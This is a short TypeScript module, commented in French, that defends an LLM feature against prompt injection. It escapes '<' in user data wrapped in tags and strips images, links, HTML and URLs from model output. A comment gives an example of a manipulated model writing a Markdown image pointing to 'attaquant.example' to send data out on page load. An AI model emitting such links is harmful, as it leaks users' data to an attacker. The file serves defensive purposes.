// Séquence JSON de « < » : du JSON valide, relu à l'identique par le modèle.
const ESCAPED_LT = String.fromCharCode(92) + 'u003c';

/**
 * Données saisies par des utilisateurs, envoyées au modèle : JSON dans une enveloppe
 * `<tag>…</tag>`. `JSON.stringify` n'échappe pas « < » : un texte contenant `</donnees>`
 * fermerait l'enveloppe et la suite serait lue comme une consigne. Tous les « < » du JSON
 * sont donc écrits avec leur séquence d'échappement JSON.
 */
export function dataBlock(tag: string, value: unknown): string {
  const json = JSON.stringify(value).replaceAll('<', ESCAPED_LT);
  return `<${tag}>\n${json}\n</${tag}>`;
}

/**
 * Retire d'un texte écrit par le modèle ce qui ferait charger ou ouvrir une adresse externe :
 * images Markdown, liens, balises HTML, adresses web. Un modèle manipulé peut écrire
 * `![](https://attaquant.example/?d=…)` : l'image, chargée par le navigateur sans clic,
 * enverrait les données à l'attaquant. Le texte des liens est gardé.
 */
export function withoutRemoteContent(text: string): string {
  return text
    .replace(/!\[([^\]]*)\]\([^)]*\)/g, '$1')
    .replace(/\[([^\]]*)\]\([^)]*\)/g, '$1')
    .replace(/<\/?[a-z][^>]*>/gi, '')
    .replace(/\b(?:https?|ftp):\/\/\S+/gi, '[lien retiré]')
    .replace(/\bwww\.\S+/gi, '[lien retiré]');
}
